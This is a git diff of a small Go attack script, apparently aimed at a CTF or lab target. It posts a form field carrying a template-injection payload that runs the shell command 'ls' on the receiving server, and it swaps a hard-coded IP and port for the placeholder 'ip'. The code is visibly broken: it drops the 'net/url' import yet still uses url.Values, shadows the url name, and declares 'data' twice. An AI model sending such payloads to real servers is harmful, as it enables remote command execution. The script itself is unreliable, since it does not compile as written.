@@ -1,15 +1,15 @@
 package main
 
 import (
-	"net/http"
-	"net/url"
-	"os/user"
-	"log"
 	"fmt"
+	"log"
+	"net/http"
+	"os/user"
 )
- func main() {
 
-  url := fmt.Sprintf("94.237.59.206:42477")
+func main() {
+
+	url := fmt.Sprintf("ip")
 	data := `{"":"value1"}`
 
 	currentUser, err := user.Current()
@@ -17,7 +17,7 @@ import (
 		log.Fatal(err)
 	}
 
-  data := url.Values{}
+	data := url.Values{}
 	data.Set("email", "{% import os %}{{os.system('ls')}}")
 
 	resp, err := http.PostForm(url, data)
@@ -28,4 +28,3 @@ import (
 
 	fmt.Println("response status:", resp.Status)
 }
-
